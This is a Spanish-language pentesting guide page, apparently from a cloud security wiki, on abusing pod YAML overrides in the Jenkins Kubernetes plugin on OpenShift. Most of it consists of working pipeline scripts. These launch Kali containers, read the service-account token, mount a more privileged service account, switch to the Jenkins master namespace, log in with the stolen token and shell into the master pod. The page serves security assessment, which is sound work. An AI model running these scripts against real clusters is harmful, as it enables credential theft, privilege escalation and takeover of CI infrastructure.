# Jenkins en Openshift - sobrescrituras de pod de construcción

**El autor original de esta página es** [**Fares**](https://www.linkedin.com/in/fares-siala/)

## Plugin de Kubernetes para Jenkins
Este plugin es principalmente responsable de las funciones centrales de Jenkins dentro de un clúster de openshift/kubernetes. Documentación oficial [aquí](https://plugins.jenkins.io/kubernetes/)
Ofrece algunas funcionalidades como la capacidad para que los desarrolladores sobrescriban algunas configuraciones predeterminadas de un pod de construcción de jenkins.

## Funcionalidad principal

Este plugin permite flexibilidad a los desarrolladores al construir su código en un entorno adecuado.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: maven
image: maven:3.8.1-jdk-8
command:
- sleep
args:
- 99d
''') {
node(POD_LABEL) {
stage('Get a Maven project') {
git 'https://github.com/jenkinsci/kubernetes-plugin.git'
container('maven') {
stage('Build a Maven project') {
sh 'mvn -B -ntp clean install'
}
}
}
}
}
```
## Algunos abusos aprovechando la anulación de yaml de pod

Sin embargo, se puede abusar para usar cualquier imagen accesible, como Kali Linux, y ejecutar comandos arbitrarios utilizando herramientas preinstaladas de esa imagen. En el ejemplo a continuación, podemos exfiltrar el token de serviceaccount del pod en ejecución.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: kali
image: myregistry/mykali_image:1.0
command:
- sleep
args:
- 1d
''') {
node(POD_LABEL) {
stage('Evil build') {
container('kali') {
stage('Extract openshift token') {
sh 'cat /run/secrets/kubernetes.io/serviceaccount/token'
}
}
}
}
}
```
Una sintaxis diferente para lograr el mismo objetivo.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Ejemplo para anular el espacio de nombres del pod
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: RANDOM-NAMESPACE
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Otro ejemplo que intenta montar un serviceaccount (que puede tener más permisos que el predeterminado, ejecutando tu build) basado en su nombre. Es posible que necesites adivinar o enumerar los serviceaccounts existentes primero.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: MY_SERVICE_ACCOUNT
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
La misma técnica se aplica para intentar montar un Secret. El objetivo final aquí sería averiguar cómo configurar la construcción de tu pod para pivotar o ganar privilegios de manera efectiva.

## Ir más allá

Una vez que te acostumbres a jugar con ello, utiliza tu conocimiento sobre Jenkins y Kubernetes/Openshift para encontrar configuraciones incorrectas / abusos.

Pregúntate las siguientes preguntas:

- ¿Qué cuenta de servicio se está utilizando para desplegar pods de construcción?
- ¿Qué roles y permisos tiene? ¿Puede leer secretos del namespace en el que me encuentro actualmente?
- ¿Puedo enumerar más pods de construcción?
- Desde un sa comprometido, ¿puedo ejecutar comandos en el nodo/pod maestro?
- ¿Puedo enumerar más el clúster para pivotar a otro lugar?
- ¿Qué SCC se aplica?

Puedes averiguar qué comandos oc/kubectl emitir [aquí](../openshift-basic-information.md) y [aquí](../../kubernetes-security/kubernetes-enumeration.md).

### Posibles escenarios de privesc/pivoting

Supongamos que durante tu evaluación descubriste que todas las construcciones de jenkins se ejecutan dentro de un namespace llamado _worker-ns_. Te diste cuenta de que una cuenta de servicio predeterminada llamada _default-sa_ está montada en los pods de construcción, sin embargo, no tiene muchos permisos excepto acceso de lectura a algunos recursos, pero pudiste identificar una cuenta de servicio existente llamada _master-sa_.
Supongamos también que tienes el comando oc instalado dentro del contenedor de construcción en ejecución.

Con el siguiente script de construcción puedes tomar control de la cuenta de servicio _master-sa_ y enumerar más.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: master-sa
containers:
- name: evil
image: random_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
sh 'token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)'
sh 'oc --token=$token whoami'
}
}
}
}
}
}
```
Dependiendo de su acceso, o necesita continuar su ataque desde el script de construcción o puede iniciar sesión directamente como este sa en el clúster en ejecución:
```bash
oc login --token=$token --server=https://apiserver.com:port
```
Si este sa tiene suficientes permisos (como pod/exec), también puedes tomar el control de toda la instancia de jenkins ejecutando comandos dentro del pod del nodo maestro, si se está ejecutando dentro del mismo espacio de nombres. Puedes identificar fácilmente este pod a través de su nombre y por el hecho de que debe estar montando un PVC (reclamación de volumen persistente) utilizado para almacenar datos de jenkins.
```bash
oc rsh pod_name -c container_name
```
En caso de que el pod del nodo maestro no esté ejecutándose dentro del mismo espacio de nombres que los trabajadores, puedes intentar ataques similares dirigiéndote al espacio de nombres maestro. Supongamos que se llama _jenkins-master_. Ten en cuenta que el serviceAccount master-sa debe existir en el espacio de nombres _jenkins-master_ (y puede que no exista en el espacio de nombres _worker-ns_).
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: jenkins-master
spec:
serviceAccount: master-sa
containers:
- name: evil-build
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
